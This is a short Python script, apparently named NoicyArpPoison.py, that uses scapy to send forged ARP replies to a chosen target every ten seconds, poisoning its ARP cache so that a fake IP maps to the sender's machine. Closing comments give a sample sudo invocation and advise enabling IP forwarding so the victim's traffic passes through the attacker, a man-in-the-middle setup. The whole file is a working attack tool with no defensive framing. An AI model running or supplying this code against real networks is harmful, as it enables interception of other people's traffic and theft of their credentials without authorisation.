#!/usr/bin/python

import sys, time
from scapy.all import sendp, ARP, Ether


# If not enough arguments passed to script execution
if len(sys.argv) < 3: 
    print(f"{sys.argv[0]}: <target_ip> <fake_ip>")
    sys.exit(1)

interface = "eth0"
target_ip = sys.argv[1]
fake_ip   = sys.argv[2]

ehernet = Ether()

# Construction of ARP header
arp = ARP(pdst=target_ip,
          psrc=fake_ip,
          op="is-at")   # OP-Code: Declare packet as ARP response

packet = ehernet / arp  # The packet containing the Ethernet & ARP header

while True: # Sends the packet every 10 seconds
    sendp(packet, iface=interface)  # Sends packet on layer-2 of the OSI-model  
    time.sleep(10)    


# sudo python NoicyArpPoison.py 192.168.0.1 192.168.0.6
# !! Enable IP forwarding to allow connection from victim: sysctl net.ipv4.ip_forward=1